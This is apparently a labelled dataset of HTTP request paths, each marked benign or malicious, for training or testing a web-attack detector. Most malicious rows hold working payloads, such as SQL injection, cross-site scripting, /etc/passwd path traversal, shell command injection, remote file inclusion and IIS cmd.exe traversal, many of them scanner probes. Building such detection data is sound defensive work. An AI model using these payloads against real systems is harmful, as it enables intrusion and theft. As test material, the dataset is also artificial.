request	label
/ cgi-sys / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = < textarea name =  ' file ""  ;  filename =  "" test .  < img src = a onerror = document & amp ;  # 46 ; location & amp ;  # 61 ;  & amp ;  # 34 ; http :  & amp ;  # 47 ;  & amp ;  # 47 ; evil & amp ;  # 46 ; site & amp ;  # 34 ;  >  '  > "	1
/ string / strings / parameters = 1 '  +  ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555 , 9555 )  )  +  ' 	1
"/ main . php ? logout =  ""  & ver \ xa0 > q66468753 & rem \ xa0 "	1
/ string / strings / parameters = mattos @ velazquezlarraaga . dd 	0
/ javascript / torrents . mdb 	0
/ 1165828787 / 	0
/ string / str =  $  ( echo zphyvs )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # 	1
/ javascript / blogs . cgi 	0
/ v_131872 / 	0
/ logogametap / 	0
/ javascript / ia . db 	0
/ string / strings / parameters = 2420 	0
/ string / modo = entrar & login = belva & pwd = revivificar & remember = on & b1 = entrar 	0
/ javascript / test3 . exe 	1
/ install / installwizard . aspx 	0
/ cacti / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / strings / parameters = jana 	0
"/ en-us / ddoworrl . pl ?  < meta http-equiv = set-cookie content =  "" testvlau = 8517 ""  > "	1
/ string / modo = registro & login = calley & password = postifijo & nombre = naiara & apellidos = baldo + urra & email = wildhagen_cavender @ hotelestopsecret . kp & dni = 91334515c & direccion =   & ciudad = jauln & cp = 04280 & provincia = vila & ntc = 4540479003454435 & b1 = registrar 	1
"/ string / strings / parameters = ; echo $ ifsmdodng $  (  ( 16 + 33 )  )  $  ( echo $ ifsmdodng ) mdodng "" "	1
/ string / strings / parameters = zorita de la frontera 	0
/ 060616 / 	0
/ string / strings / parameters = ten . tar 	0
/ string / strings / parameters = 1 where 4844 = 4844 ; select case when 3252 = 9622 then 1 else null end -- 	1
"/ string / strings / parameters = -5182 ""  ""  )  )  or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  # "	1
/ point-counterpoint / 	0
/ string / strings / parameters = < a href = javascript : alert ( 1 )  > click 	1
/ banner_ref / 	0
"/ string / strings / parameters = 1 ""  ""  )  where 7548 = 7548 ; select sleep ( 5 )  -- "	1
/ string / strings / parameters = |   [  3 -ne  $  ( echo annqck  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
"/ string / strings / parameters = < script > document . cookie =  "" testyrbs = 2855 ;  ""  <  / script > "	1
/ string / strings / parameters = ; echo $ ifsmlefqq $  (  ( 44 + 34 )  )  $  ( echo $ ifsmlefqq ) mlefqq \  \ 	1
/ fleche-bas / 	0
"/ bn857frh . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 96 * 163 / 	0
"/ agent_affil . pl ? login =  < script > alert (  "" 414395594702 ""  )  ;  <  / script > "	1
/ help . php ? q =  '  & sleep 8  # 	1
/ string / modo = registro & login = gustave & password = v3o8720a & nombre = mara + begonia & apellidos = fain + motj & email = dyne @ somosagelespaa . us & dni = 30663985v & direcciona = calle + antonio + gramsci + 30 ,  + 12 ? b & ciudad = narros + del + puerto & cp = 40183 & provincia = zamora & ntc = 4102151120364510 & b1 = registrar 	1
/ string / strings / parameters = cachapera 	0
/ idc_whitepaper / 	0
/ javascript / templates . do 	0
/ mjq2ntcz / 	0
/ string / strings / parameters = 5exas9labo 	0
/ phpmyadmin / documentation . html ? phpmyadmin =  .  .  /  .  .  /  /  .  .  /  .  .  /  /  .  .  /  .  .  /  /  .  .  /  .  .  /  /  .  .  /  .  .  /  /  .  .  /  .  .  /  /  .  .  /  .  .  /  /  .  .  /  .  .  /  / etc / passwd 	1
/ clipsyndicate / 	0
/ b3_home / 	0
/ bn857frh . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = bollullos par del condado 	0
/ 310504 / 	0
/ examples / servlets / servlet / search . php ? submit = true & search =  '  )  ; 	1
/ string / strings / parameters = cecile 	0
/ fujifilm-z3 / 	0
/ string / id = 3 & nombre = jamn + ibrico & precio = 85 & cantidad =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = aadir + al + carrito 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' wadx '  where 4287 = 4287 or sleep ( 5 )  # 	1
/ javascript / sbin . ora 	0
/ string / strings / parameters = |   [  9 -ne  $  ( echo cxwpxj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ vb_file / 	0
/ string / modo = registro & login = cunanan & password = a0_idia & nombre = rufil & apellidos = adans + zul & email = tengroth @ academiaversal . md & dni = 22961726k & direccion = c /  + pablo + serrano + 53 + 1 ? g & ciudad = olmos + de + ojeda & cp = 39392 & provincia = palencia & ntc = 1862612098499070 & b1 = registrar 	0
/ string / strings / parameters = 0562626230095582 	0
"/ search . jsp ? q =  %  ""  < script > alert ( 1332010391 )  <  / script > "	1
/ 136254 / 	0
/ james-m / 	0
/ javascript / alpha . dump 	0
/ supermarketpressrelease040506 / 	0
/ string / modo = insertar & precio = 913 & b1 = pasar + por + caja 	0
/ clingy / 	0
/ 1432026932 / 	0
/ string / strings / parameters = -6353 %  '  )  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  '  %  '  =  ' 	1
/ examples / jsp / error / includes / config . php ? relative_script_path = http :  /  / xxxxxxx 	1
/ password . asp 	0
/ dewey-political / 	0
/ string / modo = insertar & precio = 7384 & b1 = confirmar / 	1
/ javascript / _common . vb 	0
/ arenarock / 	0
/ string / strings / parameters = bohord1r 	0
/ blox-fever / 	0
/ rpmrebuild / 	0
/ en-us / esmozg5d . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ nor_subscribe / 	0
"/ string / strings / parameters = ""  |   [  7 -ne  $  ( echo mnlbvu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | "	1
/ string / strings / parameters = c ! andeleta 	0
/ examples / jsp / colors / cwmail . exe 	1
/ string / modo = insertar & precio = 1882 & b1 = confirmar 	0
/ index . php ? page =  / etc / passwd \ x00 	1
/ string / modo = entrar & login = lrcrich & pwd = veguera & remember = on /  & b1 = entrar 	1
/ cgi-bin / config . php ? path [ docroot ]  =  / etc / passwd \ x00 	1
/ whilesupplieslastcategoryus / 	0
/ rodgers / 	0
/ 462245643xpbwxi_th / 	0
/ ike-scan / 	0
/ string / strings / parameters = kepekci 	0
/ string / strings / parameters = 1 )  )  )  or sleep ( 5 )  # 	1
/ string / strings / parameters = 1 '  )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  ' xfmq '  =  ' xfmq 	1
/ string / strings / parameters = 4750834665833814 	0
"/ top . php ? stuff =  ""  \ x0arm \ x09q64118446 \ x09 # "	1
/ string / strings / parameters = < script test > alert ( 1 )  <  / script testtest > 	1
/ rcanimal / 	0
"/ ao22ww7y . asp ?  < script > document . cookie =  "" testqppc = 8767 ;  ""  <  / script > "	1
/ string / modo = any ?  set-cookie :  + tamper = 5765205567234876235 & login = kinnaird & password = 9r2sta1o191a & nombre = nadra & apellidos = taronger & email = moriarity @ centralitatelefonicavirtual . bn & dni = 97649616b & direccion = 112 + 26 ,  + 2f & ciudad = mogarraz & cp = 34247 & provincia = valencia & ntc = 2104962244988688 & b1 = registrar 	1
/ phpmyadmin / lang / lang . php ? lang_path =  / etc / passwd \ x00 	1
/ javascript / pt . manifest 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 5b + e8 + 57 + 00 + 00 + 00 + 01 + d3 + 5e + 5a + 5f + 58 + ff + e3 + e8 + ed + ff + ff + ff + 7f + e9 + f4 + 09 + 57 + 69 +  +  >  > esbq "	1
/ 15806000-15806999 / 	0
"/ zln2hm2z . exe ?  < script > document . cookie =  "" testblcp = 8120 ;  ""  <  / script > "	1
/ javascript / ignore . xls 	0
"/ 7u1pb2xi . pl ?  < script > document . cookie =  "" testlwwz = 718 ;  ""  <  / script > "	1
/ offerta-vacanza / 	0
"/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo fkfulk )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ string / id = 1 & nombre = vino + rioja & precio = 100set-cookie :  + tamper = 1041264011025374727 & cantidad = 55 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = lacivo 	0
/ string / id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 40 & b1 = aadir + al + carrito 	0
/ codigos / 	0
/ cgi-bin / windmail . exe 	1
/ mailboxfiletobemail / 	0
/ string / strings / parameters = 13021468h 	0
/ string / modo = registro & login = schenck6 & password = velocpedo & nombre = rangle & apellidos = santalo + gabas & email = gelman_fildes @ qcole . et & dni = 20787549b & direccion = lugar + montaa + del + palmital ,  + 143 ,  + 8-e & ciudad = maracena & cp =  |  & provincia = toledo & ntc = 1669337364255501 & b1 = registrar 	1
/ string / strings / parameters = 74 	0
/ string / modo = entrar & login = mu ' enst / er & pwd = infr06g9ble & remember = on & b1 = entrar 	1
/ ad_officelivebasics / 	0
"/ string / strings / parameters = < a href =  "" rhainfosec . com ""  onmouseover = alert ( 1 )  > clickhere <  / a > "	1
/ string / strings / parameters = 69346006v 	0
/ string / strings / parameters = tu6e3a5a 	0
/ string / strings / parameters = )  ;  } print (  ` echo bcmroj ; echo  $  (  ( 2 + 69 )  )  ; echo bcmroj ; echo bcmroj `  )  ;  .  ' bcmroj 	1
/ string / strings / parameters = ;  str =  $  ( echo yuqked )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/  .  /  /  .  .  /  /  .  /  /  .  .  /  /  .  /  /  .  .  /  /  .  /  /  .  .  /  /  .  /  /  .  .  /  /  .  /  /  .  .  /  /  .  /  /  .  .  /  /  { file } 	1
/ networker-im / 	0
/ supportwarehouse / 	0
/ string / strings / parameters = c /  francisco rodriguez 48 	0
"/ 1qwv2p5p . x ?  < script > document . cookie =  "" testvqcy = 252 ;  ""  <  / script > "	1
/ 421768 / 	0
/ string / strings / parameters = -7453 '  )  )  )  or 8571 = 8571 -- 	1
/ javascript / key . msg 	0
/ string / str =  $  ( echo ikkweg )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # 	1
/ string / strings / parameters = casado vallcorba 	0
/ main . php ? logout =  ' ls ' 	1
/ string / strings / parameters = 1 )  where 8008 = 8008 and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  -- 	1
"/ main . php ? logout =  ""  & ping \ x09-w \ x0911000 \ x09-n \ x091 \ x094 . 3 . 2 . 1 & rem \ x09 "	1
/ cgi-bin / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1332008327 '  )  <  / script > 	1
/ string / strings / parameters = 22639557j 	0
/ string / id = set-cookie :  + tamper = 1041264011025374727 	1
/ examples / jsp / num / mlog . html ? screen =  / etc / passwd 	1
/ string / strings / parameters = 4296 	0
"/ help . php ? q =  "" ver ,  > q58627156 & rem , "	1
/ product_top / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  union all select null , null , null , null , null , null , null , null , null -- "	1
/ sw_internet / 	0
/ string / modo = insertar & precio = 7840 & b1 = confirmar 	0
/ string / str =  $  ( echo nndfmh )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ 000119173 / 	0
/ string / strings / parameters = 7x 	0
/ string / strings / parameters = 1 )  )  as hgtl where 3864 = 3864 and elt ( 3114 = 3114 , sleep ( 5 )  )  # 	1
/ b000bobgui / 	0
/ scripts / sitemap . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  ? 	1
/ 10-leavin '  to l / 	1
/ examples / jsp / checkbox / index . pl / homels ? func = add ; class = webgui :  : asset :  : wobject :  : article ; print  ` id `  ; 	1
/ string / strings / parameters = josee 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 39 & cantidad = 91 & b1 = aadir + al + carrito 	0
/ 140450 / 	0
/ parttimejobsingeorgia / 	0
/ work_circumstances / 	0
/ dianfen / 	0
/ h21y8w52 . asp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = frison @ barnizultravioleta . jm 	0
/ in good company svcd / 	0
/ recordings / js / scripts . php ? load =  / etc / passwd \ x00 	1
/ string / strings / parameters = m86uca 	0
/ ldjudgmt / 	0
/ string / strings / parameters = c /  cardenal cisneros 5 	0
/ javascript / admin . pfx 	0
/ 26084272 / 	0
/ string / modo = registro & login = ingeberg & password = sahumador & nombre = silveria & apellidos = giglio + beitia & email = malik @ clubdeviaje . so & dni = 90164620c |  & direccion = calle + agustin + parejo + s / n +  & ciudad = tierzo & cp = 45214 & provincia = cuenca & ntc = 1661352474337104 & b1 = registrar 	1
/ inc / download_center_lite . inc . php ? script_root = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ? 	1
/ javascript / eric . do 	0
/ javascript / crons . ini 	0
/ string / strings / parameters = gavald 	0
/ s7qus4g3 . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = wackers_donlin @ gesautonomos . bh 	0
/ string / strings / parameters = 1 )  where 1487 = 1487 ; begin dbms_lock . sleep ( 5 )  ;  end -- 	1
/ string / strings / parameters = pesillo 	0
/ string / strings / parameters = e906aci9 	0
/ string / strings / parameters = av .  vicente mortes ,  78 ,  8 ? f 	0
/ debug / dbg ? host =  =  < script > alert (  ' vulnerable '  )  ;  <  / script > 	1
/ string / modo = insertar & precio = 4189 & b1 = pasar + por + caja 	0
/ string / strings / parameters = 45789 	0
/ string / strings / parameters = '  ;  str =  $  ( echo psujgu )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ doc / changelog 	0
/ string / strings / parameters = colmada 	0
/ string / strings / parameters = 5793462659286586 	0
/ 585496 / 	0
/ string / strings / parameters = ella 	0
/ examples / servlets / servlet / news . php ? prevnext = 1 ' phpnews_prevnext_sql_injection . nasl 	1
/ string / strings / parameters = 1 or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 ) 	1
/ nt-ssh / 	0
/ examples / servlets / servlet / fxm . exe 	1
/ 2004pres / 	0
/ string / strings / parameters = dis0reg2r 	0
/ string / strings / parameters = '  ; echo mhqwaf $  (  ( 29 + 52 )  )  $  ( echo mhqwaf ) mhqwaf ' 	1
/ string / modo = registro & login = millaire & password = pintoja & nombre = ceciliano & apellidos = ballest + carranza & email = wagenhiem_hollingsworth @ eddydaniele . museum & dni = 27857756h & direccion = calle + luis + mila + 23 + 10 ? a & ciudad = guadalupe & cp = 09500 & provincia = ml .  . ag . a & ntc = 2397290594537988 & b1 = registrar 	1
/ string / strings / parameters = <  %  /  %  =  %  >  < p / onresize = alert ( 1 )  /  /  > 	1
"/ string / strings / parameters = <  !  --  # echo var =  "" forwarded ""   --  > "	1
/ string / strings / parameters = ;  str =  $  ( echo ytykpd )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ javascript / statement . cnf 	0
"/ r3le3om5 . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ _vti_bin /  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt / system32 / cmd . exe ?  / c + dir 	1
/ string / modo = insertar '  + delete + from + users & precio = 4903 & b1 = pasar + por + caja 	1
/ scooby / 	0
/ string / modo = entrar & login = healy & pwd = c3er2e4ue15 & remember = on & b1 = entrar 	0
/ string / str =  $  ( echo uvfukr )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi 	1
/ string / strings / parameters = pego ,  el 	0
"/ string / strings / parameters = ""   str =  $  ( echo sfurkw )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & "	1
/ jason_rohrer / 	0
/ javascript / qpid . pem 	0
/ string / strings / parameters = cercedilla 	0
/ string / strings / parameters = shaibal 	0
/ scripts / sqwebmail ? redirect =  \ x0d \ x0a \ x0d \ x0asqwebmail_http_splitting . nasl 	1
"/ string / strings / parameters = '  &  & echo djdlks $  (  ( 28 + 16 )  )  $  ( echo djdlks ) djdlks "" "	1
/ scripts / forums . asp ? ifor = duforum_sql_injections . nasl ' 	1
/ 123313 / 	0
/ cgi-bin / admin / components / com_fm / fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = limbo_com_fm_php_shell . nasl-1332008331 	1
/ creid-50 / 	0
/ phpmyadmin / af . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd 	1
/ string / strings / parameters = 2817906891960680 	0
/ rssperfcomparison041905 / 	0
/ 870292 / 	0
/ trojmosuckg / 	0
/ string / modo = entrar & login = berenice & pwd = enfeudacin & remember = off /  & b1 = entrar 	1
/ 340808 / 	0
/ stopzilla-download / 	0
/ 0814index / 	0
/ string / strings / parameters = echo cwrxrj $  (  ( 77 + 13 )  )  $  ( echo cwrxrj ) cwrxrj 	1
/ help . php ? q =  '  \ x0dsleep \ x097 \ x09 # 	1
/ string / strings / parameters = 81403734h 	0
/ cgi-bin / webplus ? script =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ examples / jsp / cal / lib / owl_api . php ? xrms_file_root =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = valeika @ italianmotorvillagesevilla . gd 	0
/ trustbar / 	0
/ tb-email / 	0
/ examples / jsp / error / store . php ? crn = 42 '  & action = show & show_products_mode = cat_click 	1
/ string / modo = entrar & login = ephrayim & pwd = al8grar & remember = off & b1 = entrar 	0
/ string / strings / parameters = < x ondblclick = alert ( 1 )  > double click this ! 	1
"/ string / strings / parameters = 1 ""  ""  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) "	1
/ string / strings / parameters = ; echo $ ifsnzacrg $  (  ( 6 + 1 )  )  $  ( echo $ ifsnzacrg ) nzacrg & 	1
/ javascript / day . exe 	1
/ string / strings / parameters = viola5 	0
/ string / strings / parameters = ;  str =  $  ( echo zssqmt )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi 	1
"/ 8t9v8k7x . nsf ?  < meta http-equiv = set-cookie content =  "" testhvje = 9403 ""  > "	1
/ anydvd v5 / 	0
/ mechanical_turk / 	0
/ string / errormsg =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -- 	1
/ string / strings / parameters = ; echo ddxenf $  (  ( 29 + 82 )  )  $  ( echo ddxenf ) ddxenf & 	1
/ msmmask . exe ? mask =  / nessus1788090238 . asp 	1
"/ fpnpp5zg . do ?  < script > document . cookie =  "" testyias = 101 ;  ""  <  / script > "	1
/ deerheadhat / 	0
/ javascript / document . out 	1
/ javascript / subscription . html 	0
/ string / strings / parameters = lagunaseca 	0
/ string / strings / parameters = 1 '  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null ) 	1
/ examples / jsp / jsp2 / jspx / index . php ? gadget = glossary & action = view & term =  < script > alert (  ' jaws_xss . nasl '  )  ;  <  / script > 	1
"/ string / id = 3 & nombre = vino + rioja & precio = 85 & cantidad = 80 & b1 =  ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  < "	1
/ string / strings / parameters = protti tarrasa 	0
/ string / modo = registro & login = mccaig & password = arribada & nombre = hortensia & apellidos = barrutia + marsany & email = kulle @ coworkers . tl & dni = 19255762r & direccion = praza + madre + lestonnac ,  + s / n +  & ciudad = paterna + del + ro & cp = 08263 & provincia = valencia & ntc = 2451542120615034 & b1 = registrar 	0
/ javascript / bugs . exe 	1
/ string / modo = entrar & login = hauersto & pwd = angeln & remember = on /  & b1 = entrar 	1
/ string / strings / parameters = 84q42o 	0
"/ main . php ? stuff =  "" ping \ x0c-w \ x0c8000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c "	1
/ workshop2-page / 	0
/ string / strings / parameters = -1807 '  )  )  union all select 9853 , 9853 , 9853 , 9853 , 9853 , 9853 # 	1
/ javascript / opencart . shtml 	0
/ string / strings / parameters = calle virginia wolf ,  145 10-a 	0
/ string / strings / parameters = 48c49p59a 	0
"/ main . php ? stuff =  "" del , q37721326 & rem , "	1
/ string / strings / parameters = 1 '  )  where 1027 = 1027 and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  -- 	1
/ jsoft2 / 	0
/ usdoe02 / 	0
/ javascript / edu . save 	0
/ b1031-90043 / 	0
/ tabothersites180x22 / 	0
/ string / strings / parameters = buehlmann . mcdonall @ qcole . sn 	0
/ files / mbox-list . php3 ? bsx_libdir = xxpathxx 	1
/ betablockmodules / networkmoderateusermodule / networkmoderateusermodule . php ? path_prefix = xxpathxx 	1
"/ string / strings / parameters = < div id =  "" 54 ""  >  < script >  [  {  ' a '  : object . prototype . __definesetter__ (  ' b '  , function (  )  { alert ( arguments [ 0 ]  )  }  )  ,  ' b '  :  [  ' secret '  ]  }  ]  <  / script >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div >  < div id =  "" 55 ""  >  < video >  < source onerror =  "" alert ( 55 )  ""  >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div >  < div id =  "" 56 ""  >  < video onerror =  "" alert ( 56 )  ""  >  < source >  <  / source >  <  / video >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div >  < div id =  "" 57 ""  >  < b  < script > alert ( 57 )  /  /  <  / script > 0 <  / script >  <  / b >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div >  < div id =  "" 58 ""  >  < b >  < script < b >  <  / b >  < alert ( 58 )  <  / script  <  / b >  <  / b >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div >  < div id =  "" 59 ""  >  < div id =  "" div1 ""  >  < input value =  ""  `  ` onmouseover = alert ( 59 )  ""  >  <  / div >   < div id =  "" div2 ""  >  <  / div >  < script > document . getelementbyid (  "" div2 ""  )  . innerhtml  =  document . getelementbyid (  "" div1 ""  )  . innerhtml ;  <  / script >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div >  < div id =  "" 60 ""  >  < div style =  ""  [ a ] color [ b ]  :  [ c ] red ""  > xxx <  / div >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div > "	1
/ iowargames / 	0
/ lib / action / rss . php ? lib = xxpathxx ? 	1
/ string / id = 2 & nombre = jamn + ibrico & precio = 100 & cantidad = 63 & b1 = aadir + al + carrito 	0
"/ zln2hm2z . fts ?  < meta http-equiv = set-cookie content =  "" testblcp = 8120 ""  > "	1
/ examples / jsp / colors /  / atk / javascript / class . atkdateattribute . js . php ? config_atkroot = http :  /  / xxxxxxxxxx / 	0
"/ ybz5rz7a . cfc ?  < script > document . cookie =  "" testsbvw = 6289 ;  ""  <  / script > "	1
/ string / strings / parameters = tronchn 	0
/ en-us / 7o5qp766 . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ examples / jsp / jsp2 / jspx / commsrss . php ? files [ 0 ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = -4157 '  )  or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  ' rdhm '  =  ' rdhm 	1
/ string / strings / parameters = $  { system ( print (  ` echo mqqjpg \ necho  $  (  ( 72 + 19 )  )  \ necho mqqjpg \ necho mqqjpg `  )  ;  # mqqjpg 	1
/ javascript / crack . war 	0
/ string / modo = registro & login = boisvert & password = ma27ta & nombre = paladio & apellidos = d ' amico + urrea & email = mcnear . trotta @ lettere . ve & dni = 11295198j & direccion = robert + graves ,  + 101 +  & ciudad = casillas + de + flores & cp = 50300 & provincia = madrid & ntc = 1889610781907232 & b1 = registrar 	0
/ 042340 / 	0
/ javascript / pub . o 	0
/ string / strings / parameters = nobuo 	0
"/ string / modo = registro & login = snuggs & password = recie . nte & nombre = caritian & apellidos = celaya + gaytan & email = treman_worde @ pavimentosalagon . so & dni = 75925253e & direccion = carrer + sant + celoni + 39 ,  + 8-h & ciudad = cepeda + la + mora & cp =  < script > alert (  "" paros ""  )  ;  <  / script >  & provincia = sevilla & ntc = 0439326406567851 & b1 = registrar "	1
"/ string / strings / parameters = '   str =  $  ( echo bxlxvp )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ javascript / jp . jhtml 	0
/ string / strings / parameters = 1 where 2382 = 2382 ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  # 	1
"/  < meta http-equiv = set-cookie content =  "" testpcbb = 9254 ""  > "	1
"/ l4fz1dqw . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ main . php ? stuff =  ; sleep \ x099 \ x09 # 	1
/ string / modo = registro & login = letsome9 & password = simple & nombre = perfecta & apellidos = lowery + volta & email = seel @ indorec . ge & dni = 05171912v & direccion = c /  + agustina + fierra ,  + 49 ,  +  & ciudad = villabasta + de + vald /  ? avia & cp = 46715 & provincia = burgos & ntc = 6556979183874771 & b1 = registrar 	1
/ netflowsysreq / 	0
"/ string / strings / parameters = < input type =  "" text ""  value =  `  `  < div / onmouseover =  ' alert ( 1 )  '  > x <  / div > "	1
/ ofnc17112003235088d / 	0
